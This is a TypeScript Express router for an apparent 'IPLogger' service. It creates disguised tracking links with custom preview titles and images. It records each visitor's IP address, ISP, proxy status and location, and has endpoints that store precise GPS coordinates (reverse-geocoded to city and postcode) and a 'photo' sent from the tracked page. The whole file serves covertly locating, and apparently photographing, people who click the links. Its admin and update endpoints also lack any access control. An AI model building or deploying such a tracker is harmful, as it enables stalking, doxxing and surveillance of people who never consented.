import { Router, type IRouter } from "express";
  import { eq, desc, count, countDistinct, gte } from "drizzle-orm";
  import { db, trackingLinksTable, ipLogsTable } from "@workspace/db";
  import {
    CreateLinkBody,
    GetLinkParams,
    DeleteLinkParams,
    GetLinkLogsParams,
    DeleteLogParams,
  } from "@workspace/api-zod";
  import { randomBytes } from "crypto";
  import { handleTrack } from "./short";

  const router: IRouter = Router();

  const BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

  function generateToken(): string {
    const bytes = randomBytes(6);
    let token = "";
    for (const byte of bytes) {
      token += BASE62[byte % 62];
    }
    return token;
  }

  function generateSlug(): string {
    const bytes = randomBytes(7);
    let slug = "ZS";
    for (const byte of bytes) {
      slug += BASE62[byte % 62];
    }
    return slug;
  }

  function serializeLink(l: typeof trackingLinksTable.$inferSelect) {
    return {
      ...l,
      createdAt: l.createdAt.toISOString(),
      slug: l.slug ?? null,
      description: l.description ?? null,
      redirectUrl: l.redirectUrl ?? null,
      ogTitle: l.ogTitle ?? null,
      ogDescription: l.ogDescription ?? null,
      ogImage: l.ogImage ?? null,
    };
  }

  function serializeLog(l: typeof ipLogsTable.$inferSelect & { linkName?: string | null }) {
    return {
      ...l,
      linkName: l.linkName ?? null,
      createdAt: l.createdAt.toISOString(),
      userAgent: l.userAgent ?? null,
      country: l.country ?? null,
      region: l.region ?? null,
      city: l.city ?? null,
      zip: l.zip ?? null,
      lat: l.lat ?? null,
      lon: l.lon ?? null,
      gpsAccuracy: l.gpsAccuracy ?? null,
      timezone: l.timezone ?? null,
      isp: l.isp ?? null,
      org: l.org ?? null,
      asn: l.asn ?? null,
      mobile: l.mobile ?? null,
      proxy: l.proxy ?? null,
      hosting: l.hosting ?? null,
      referrer: l.referrer ?? null,
      photo: l.photo ?? null,
    };
  }

  router.get("/links", async (_req, res): Promise<void> => {
    const links = await db
      .select()
      .from(trackingLinksTable)
      .orderBy(desc(trackingLinksTable.createdAt));
    res.json(links.map(serializeLink));
  });

  router.post("/links", async (req, res): Promise<void> => {
    const parsed = CreateLinkBody.safeParse(req.body);
    if (!parsed.success) {
      res.status(400).json({ error: parsed.error.message });
      return;
    }

    const token = generateToken();
    const slug = parsed.data.slug ?? generateSlug();

    const [existing] = await db
      .select({ id: trackingLinksTable.id })
      .from(trackingLinksTable)
      .where(eq(trackingLinksTable.slug, slug));

    if (existing) {
      res.status(409).json({ error: "Slug already taken, choose a different one" });
      return;
    }

    const [link] = await db
      .insert(trackingLinksTable)
      .values({
        name: parsed.data.name,
        token,
        slug,
        description: parsed.data.description ?? null,
        redirectUrl: parsed.data.redirectUrl ?? null,
        ogTitle: parsed.data.ogTitle ?? null,
        ogDescription: parsed.data.ogDescription ?? null,
        ogImage: parsed.data.ogImage ?? null,
      })
      .returning();

    res.status(201).json(serializeLink(link));
  });

  router.get("/links/:id", async (req, res): Promise<void> => {
    const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const params = GetLinkParams.safeParse({ id: parseInt(raw, 10) });
    if (!params.success) {
      res.status(400).json({ error: params.error.message });
      return;
    }

    const [link] = await db
      .select()
      .from(trackingLinksTable)
      .where(eq(trackingLinksTable.id, params.data.id));

    if (!link) {
      res.status(404).json({ error: "Link not found" });
      return;
    }

    res.json(serializeLink(link));
  });

  router.delete("/links/:id", async (req, res): Promise<void> => {
    const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const params = DeleteLinkParams.safeParse({ id: parseInt(raw, 10) });
    if (!params.success) {
      res.status(400).json({ error: params.error.message });
      return;
    }

    const [link] = await db
      .delete(trackingLinksTable)
      .where(eq(trackingLinksTable.id, params.data.id))
      .returning();

    if (!link) {
      res.status(404).json({ error: "Link not found" });
      return;
    }

    res.sendStatus(204);
  });

  router.get("/links/:id/logs", async (req, res): Promise<void> => {
    const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const params = GetLinkLogsParams.safeParse({ id: parseInt(raw, 10) });
    if (!params.success) {
      res.status(400).json({ error: params.error.message });
      return;
    }

    const [link] = await db
      .select({ name: trackingLinksTable.name })
      .from(trackingLinksTable)
      .where(eq(trackingLinksTable.id, params.data.id));

    const logs = await db
      .select()
      .from(ipLogsTable)
      .where(eq(ipLogsTable.linkId, params.data.id))
      .orderBy(desc(ipLogsTable.createdAt));

    res.json(logs.map((l) => serializeLog({ ...l, linkName: link?.name ?? null })));
  });

  router.get("/logs", async (_req, res): Promise<void> => {
    const logs = await db
      .select({
        id: ipLogsTable.id,
        linkId: ipLogsTable.linkId,
        linkName: trackingLinksTable.name,
        ip: ipLogsTable.ip,
        userAgent: ipLogsTable.userAgent,
        country: ipLogsTable.country,
        region: ipLogsTable.region,
        city: ipLogsTable.city,
        zip: ipLogsTable.zip,
        lat: ipLogsTable.lat,
        lon: ipLogsTable.lon,
        gpsAccuracy: ipLogsTable.gpsAccuracy,
        timezone: ipLogsTable.timezone,
        isp: ipLogsTable.isp,
        org: ipLogsTable.org,
        asn: ipLogsTable.asn,
        mobile: ipLogsTable.mobile,
        proxy: ipLogsTable.proxy,
        hosting: ipLogsTable.hosting,
        referrer: ipLogsTable.referrer,
        photo: ipLogsTable.photo,
        createdAt: ipLogsTable.createdAt,
      })
      .from(ipLogsTable)
      .leftJoin(trackingLinksTable, eq(ipLogsTable.linkId, trackingLinksTable.id))
      .orderBy(desc(ipLogsTable.createdAt));

    res.json(logs.map((l) => serializeLog({ ...l, linkName: l.linkName ?? null })));
  });

  router.delete("/logs/:id", async (req, res): Promise<void> => {
    const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
    const params = DeleteLogParams.safeParse({ id: parseInt(raw, 10) });
    if (!params.success) {
      res.status(400).json({ error: params.error.message });
      return;
    }

    const [log] = await db
      .delete(ipLogsTable)
      .where(eq(ipLogsTable.id, params.data.id))
      .returning();

    if (!log) {
      res.status(404).json({ error: "Log not found" });
      return;
    }

    res.sendStatus(204);
  });

  router.get("/stats/summary", async (_req, res): Promise<void> => {
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const [[totals], [logTotals], [todayVisits], topLinks, recentLogs] = await Promise.all([
      db.select({ totalLinks: count(trackingLinksTable.id) }).from(trackingLinksTable),
      db
        .select({ totalVisits: count(ipLogsTable.id), uniqueIps: countDistinct(ipLogsTable.ip) })
        .from(ipLogsTable),
      db
        .select({ visitsToday: count(ipLogsTable.id) })
        .from(ipLogsTable)
        .where(gte(ipLogsTable.createdAt, today)),
      db
        .select()
        .from(trackingLinksTable)
        .orderBy(desc(trackingLinksTable.visitCount))
        .limit(5),
      db
        .select({
          id: ipLogsTable.id,
          linkId: ipLogsTable.linkId,
          linkName: trackingLinksTable.name,
          ip: ipLogsTable.ip,
          userAgent: ipLogsTable.userAgent,
          country: ipLogsTable.country,
          region: ipLogsTable.region,
          city: ipLogsTable.city,
          zip: ipLogsTable.zip,
          lat: ipLogsTable.lat,
          lon: ipLogsTable.lon,
          gpsAccuracy: ipLogsTable.gpsAccuracy,
          timezone: ipLogsTable.timezone,
          isp: ipLogsTable.isp,
          org: ipLogsTable.org,
          asn: ipLogsTable.asn,
          mobile: ipLogsTable.mobile,
          proxy: ipLogsTable.proxy,
          hosting: ipLogsTable.hosting,
          referrer: ipLogsTable.referrer,
          createdAt: ipLogsTable.createdAt,
        })
        .from(ipLogsTable)
        .leftJoin(trackingLinksTable, eq(ipLogsTable.linkId, trackingLinksTable.id))
        .orderBy(desc(ipLogsTable.createdAt))
        .limit(10),
    ]);

    res.json({
      totalLinks: totals?.totalLinks ?? 0,
      totalVisits: logTotals?.totalVisits ?? 0,
      uniqueIps: logTotals?.uniqueIps ?? 0,
      visitsToday: todayVisits?.visitsToday ?? 0,
      topLinks: topLinks.map(serializeLink),
      recentLogs: recentLogs.map((l) =>
        serializeLog({ ...l, photo: null, linkName: l.linkName ?? null }),
      ),
    });
  });

  router.get("/track/:token", async (req, res): Promise<void> => {
    const raw = Array.isArray(req.params.token) ? req.params.token[0] : req.params.token;
    await handleTrack(req, res, raw);
  });

  router.post("/track/:token/gps", async (req, res): Promise<void> => {
    const { lat, lon, accuracy, logId } = req.body as { lat: unknown; lon: unknown; accuracy: unknown; logId: unknown };
    if (typeof lat !== "number" || typeof lon !== "number" || typeof logId !== "number") {
      res.status(400).json({ error: "Invalid data" });
      return;
    }
    const gpsAccuracy = typeof accuracy === "number" ? accuracy : null;
    const updateData: Record<string, unknown> = { lat, lon, gpsAccuracy };
    try {
      const nominatimRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=14&addressdetails=1`,
        { headers: { "User-Agent": "IPLogger/1.0" }, signal: AbortSignal.timeout(5000) }
      );
      if (nominatimRes.ok) {
        const data = await nominatimRes.json() as { address?: { city?: string; town?: string; village?: string; suburb?: string; municipality?: string; county?: string; state?: string; country?: string; postcode?: string } };
        const addr = data.address ?? {};
        const city = addr.city ?? addr.town ?? addr.suburb ?? addr.village ?? addr.municipality;
        if (city) updateData.city = city;
        if (addr.state ?? addr.county) updateData.region = addr.state ?? addr.county;
        if (addr.country) updateData.country = addr.country;
        if (addr.postcode) updateData.zip = addr.postcode;
      }
    } catch { /* ignored */ }
    await db.update(ipLogsTable).set(updateData).where(eq(ipLogsTable.id, logId as number));
    res.json({ ok: true });
  });

  router.post("/track/:token/photo", async (req, res): Promise<void> => {
    const { photo, logId } = req.body as { photo: unknown; logId: unknown };
    if (typeof photo !== "string" || typeof logId !== "number") {
      res.status(400).json({ error: "Invalid data" });
      return;
    }
    await db.update(ipLogsTable).set({ photo }).where(eq(ipLogsTable.id, logId));
    res.json({ ok: true });
  });

  export default router;
  